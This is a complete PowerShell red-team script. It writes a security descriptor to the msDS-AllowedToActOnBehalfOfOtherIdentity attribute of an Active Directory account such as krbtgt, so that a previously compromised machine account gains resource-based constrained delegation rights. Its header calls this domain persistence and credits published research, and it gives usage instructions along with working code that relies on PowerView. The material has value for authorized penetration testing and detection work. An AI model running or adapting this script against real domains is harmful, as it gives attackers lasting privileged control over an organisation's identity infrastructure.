#
# Unconstrained Domain Persistence helper
#
# Usage:
#   PS> . .\Set-PrincipalAllowedToDelegateToAccount.ps1
#   PS> Set-PrincipalAllowedToDelegateToAccount -TargetUser krbtgt -TargetComputer COMPROMISED$
#
# Will allow for COMPROMISED$ machine account to perform S4U2 constrained delegation by the use
# of Resource-Based Constrained Delegation flavour attack.
#
# Script for setting "msDS-AllowedToActOnBehalfOfOtherIdentity" property on the user's object, 
# allowing incoming trust to the previously compromised Machine object, as described 
# by Elad Shamir in his: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence
#
# This script requires PowerView to be loaded first.
#
# This is basically rewritten script from Harmj0y's blog post here:
#   https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
# all credits goes to magnificent Harmj0y!
#

function Set-PrincipalAllowedToDelegateToAccount
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetUser,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetComputer
    )
    
    # translate the identity to a security identifier
    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $TargetComputer).Translate([System.Security.Principal.SecurityIdentifier])).Value

    # Substitute the security identifier into the raw SDDL
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"

    # get the binary bytes for the SDDL
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    # set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
    Get-DomainUser $TargetUser | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
}